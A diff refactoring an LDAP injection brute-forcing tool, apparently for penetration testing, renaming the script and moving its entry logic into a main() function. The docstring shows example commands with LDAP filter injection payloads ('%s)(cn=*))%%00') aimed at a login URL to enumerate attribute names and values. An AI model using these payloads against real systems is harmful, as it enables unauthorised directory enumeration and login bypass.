@@ -1,7 +1,7 @@
 """
 Example:
 
-python ldap-dumper.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
+python ldap_brute.py 'http://vulnerable/ldap/example2.php?name=%s)(cn=*))%%00&password=' 'AUTHENTICATED as'
 
 In this example, we inserted an expression into the param that will always
 return true if the parameter replaced by %s is true, in this case ennumerating
@@ -12,7 +12,7 @@ Strings inserted look like 'a*', 'b*', 'c*'
 
 Non-wildcard example:
 
-python ldap-dumper.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+python ldap_brute.py --no-wildcard -a gidNumber -c 'digits' --max-word-size 5 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
 Some LDAP attributes do not support wildcards, in which case you should use
 --no-wildcard. In this example, note how the %s needs to be placed right at the
@@ -24,7 +24,7 @@ Strings inserted look like
 
 Bruteforcing attributes:
 
-python ldap-dumper.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
+python ldap_brute.py -A -c lower --max-word-size=4 'http://vulnerable/ldap/example2.php?name=admin)%s)%%00&password=' 'AUTHENTICATED as'
 
 Recommend only using -c 'lower', since using digits can cause invalid
 attributes (like '9c') to be mixed with valid attributes, which is not handled
@@ -161,12 +161,11 @@ def or_loop(or_subfilter):
 
 def progress_indicate():
     LDAP_GLOBALS.total_progress_calls += 1
-    #print(LDAP_GLOBALS.total_progress_calls)
     if LDAP_GLOBALS.total_progress_calls % 50 == 0:
-        print(str(LDAP_GLOBALS.total_progress_calls) + "...")
+        logging.info(str(LDAP_GLOBALS.total_progress_calls) + "...")
 
 # all parameters are arguments gotten from the command line.
-def brute_nowild(base_url, true_string, charset, max_path_size, attribute_name, word_size, size_is_exact):
+def brute_nowild(base_url, true_string, charset, attribute_name, word_size, max_path_size=8100, size_is_exact=False):
     bruting_attr = attribute_name == LDAP_GLOBALS.BRUTE
     if bruting_attr:
         logging.info("entering non-wildcard mode for url '%s' (bruteforcing attribute names)." % base_url)
@@ -267,23 +266,14 @@ def succ(result):
         print("Valid values found (%s):\n" % time_info)
         for r in result:
             print(r)
-
-        sys.exit(1)
     else:
         print("No results found (%s.)" % time_info)
-        sys.exit(1)
 
 def err(message):
     logging.warn(message)
     sys.exit(1)
 
-if __name__ == '__main__':
-    parser = parser_get()
-    args = parser.parse_args()
-
-    logging_set(args.verbosity)
-    logging.debug(args)
-
+def main(args, output=True):
     if(args.charset_custom):
         charset = args.charset_custom
     else:
@@ -312,4 +302,15 @@ if __name__ == '__main__':
             max_path_size=args.max_path_size, attribute_name=attr,
             word_size=word_size, size_is_exact=is_exact)
 
-    succ(valid_values)
+    if(output):
+        succ(valid_values)
+
+if __name__ == '__main__':
+    parser = parser_get()
+    args = parser.parse_args()
+
+    logging_set(args.verbosity)
+    logging.debug(args)
+
+    main(args)
+
